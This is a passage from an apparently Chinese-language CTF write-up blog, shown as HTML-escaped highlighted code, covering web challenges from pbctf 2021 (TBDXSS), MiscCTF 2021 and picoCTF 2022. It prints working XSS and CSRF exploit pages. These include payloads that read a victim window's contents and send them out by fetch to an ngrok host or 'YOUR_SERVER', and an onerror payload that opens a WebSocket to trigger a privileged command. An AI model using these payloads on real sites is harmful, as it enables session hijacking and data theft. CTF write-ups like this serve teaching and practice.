&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">textarea&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;payload&amp;#34;&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#75af00">cols&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span> &lt;span style="color:#75af00">form&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;noteform&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">textarea&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// open new window that has the flag and give it a &amp;#34;name&amp;#34; of &amp;#34;flagWindow&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;flagWindow&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// this POSTs the above form with an XSS note value to read and exfiltrate the flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// note: we must use \x3C as an alternate form of the &amp;#34;less than&amp;#34; character to avoid browser parser confusion inside
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;\x3Cscript&amp;gt;let flagWindow = window.open(&amp;#39;&amp;#39;, &amp;#39;flagWindow&amp;#39;); let flag = flagWindow.document.documentElement.innerText; fetch(&amp;#39;http://8709-68-51-145-201.ngrok.io/?flag=&amp;#39; + flag);\x3C/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">noteform&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Run this code after a 5 second delay to ensure the above POST has completed before we reload our XSS payload into *this* page.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// This loads our previously-posted XSS which will read the flag from the previously-opened window and exfiltrate it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span> &lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 提供延时来让上面的script执行 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://xxxx/delayThen404&amp;#39;&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;window.location.href=&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————在另一个wp中学到delay还可以有专门的定型工具https://deelay.me/，用法是&lt;/p>
&lt;pre tabindex="0">&lt;code>https://deelay.me/&amp;lt;delay in milliseconds&amp;gt;/&amp;lt;original url&amp;gt;
eg: https://deelay.me/5000/https://picsum.photos/200/300
&lt;/code>&lt;/pre>&lt;p>所以上面的我们还可以这样做：&lt;/p>
&lt;ul>
&lt;li>index.php：做延时，转到main.php&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;
open(location.href + &amp;#39;main.php&amp;#39;, &amp;#39;_blank&amp;#39;)
&amp;lt;/script&amp;gt;
&amp;lt;img src=&amp;#34;https://deelay.me/20000/https://example.com&amp;#34;&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>main.php：新开两个tab后当前页面重定向到含flag的/note中&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;submit&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;opennote&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>submit.php：标准csrf&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://tbdxss.chal.perfect.blue/change_note&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;peko&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;const report = t =&amp;gt; fetch(&amp;#34;https://YOUR_SERVER/xss.php&amp;#34;, {method: &amp;#34;POST&amp;#34;, body: t}); report(window.opener.opener.document.body.textContent)&amp;lt;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>opennote.php：delay后在新tab的/note中执行xss payload，由于是新tab，所以需要&lt;code>window.opener.opener&lt;/code>才可以到原先的main.php&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">},&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">)&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS">wp1&lt;/a> | &lt;a href="https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss">wp2&lt;/a> | &lt;a href="https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html">wp3&lt;/a>&lt;/p>
&lt;h2 id="miscctf-2021xss-to-csrf">[MiscCTF 2021]XSS to CSRF&lt;/h2>
&lt;p>&lt;a href="https://hg8.sh/posts/misc-ctf/xss-to-csrf/">https://hg8.sh/posts/misc-ctf/xss-to-csrf/&lt;/a>&lt;/p>
&lt;p>聊天机器人，发送的语句可以包含Html 会被渲染，尝试&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;img src=x onerror=alert(1)&amp;gt;
&lt;/code>&lt;/pre>&lt;p>有反射型xsss&lt;/p>
&lt;p>进一步了解这个Bot的工作，遇到&amp;quot;badwords&amp;quot;会暂停对话，说明在后端经过了某些检测&lt;/p>
&lt;p>使用websocket进行内容的交互&lt;/p>
&lt;p>&lt;img src="https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png" alt="misc ctf chatbot websocket">&lt;/p>
&lt;p>尝试直接建立与服务端的连接&lt;/p>
&lt;pre tabindex="0">&lt;code>websocket = new WebSocket(&amp;#39;ws://misc.ctf:33433/&amp;#39;);
websocket.onmessage = function(message) { console.log(message.data); }
websocket.send(&amp;#39;test&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png" alt="misc ctf websocket chatbot connexion">&lt;/p>
&lt;p>继续尝试&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt; websocket.send(&amp;#39;/help&amp;#39;)
{ &amp;#34;content&amp;#34;: &amp;#34;&amp;lt;message&amp;gt;&amp;#34; } to send a message
/moderator to enter moderator mode debugger
&amp;gt; websocket.send(&amp;#39;/moderator&amp;#39;)
You need to be authenticated to execute this command
&lt;/code>&lt;/pre>&lt;p>我们没有直接访问/moderator的权利，借助检测&amp;quot;badwords&amp;quot;的功能，发送含有建立websocket连接的payload，用CSRF的方式让bot访问 把结果外带&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws=new WebSocket(&amp;#39;ws://&amp;#39;+window.location.host);ws.onopen=()=&amp;gt;ws.send(&amp;#39;/moderator&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>加上一个&amp;quot;badwords&amp;quot;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>🖕 &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws=new WebSocket(&amp;#39;ws://&amp;#39;+window.location.host);ws.onopen=()=&amp;gt;ws.send(&amp;#39;/moderator&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="247ctf-2021helicopter-administrator">*[247CTF 2021]Helicopter Administrator&lt;/h2>
&lt;p>&lt;a href="https://gusralph.info/exploiting-xss-for-sqli/">https://gusralph.info/exploiting-xss-for-sqli/&lt;/a>&lt;/p>
&lt;h2 id="picoctf-2022noted">[picoCTF 2022]noted&lt;/h2>
&lt;blockquote>
&lt;p>HINT:&lt;/p>
&lt;ol>
&lt;li>&amp;ldquo;Are you sure I followed all the best practices?&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;There&amp;rsquo;s more than just HTTP(S)!&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;Things that require user interaction normally in Chrome might not require it in Headless Chrome.&amp;rdquo;&lt;/li>
&lt;li>The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application.&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>登入账号后才能发内容，xss bot会先注册随机账号 登入后发flag 然后浏览我们的url，题目提示xss bot不能出网&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// report.js
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 对url无waf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">pipe&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;--incognito&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--disable-setuid-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">slowMo&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">pages&lt;/span>&lt;span style="color:#111">())[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://0.0.0.0:8080/register&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 注册随机账号
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;username&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;password&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[type=&amp;#34;submit&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">waituntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;domcontentloaded&amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://0.0.0.0:8080/new&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;title&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
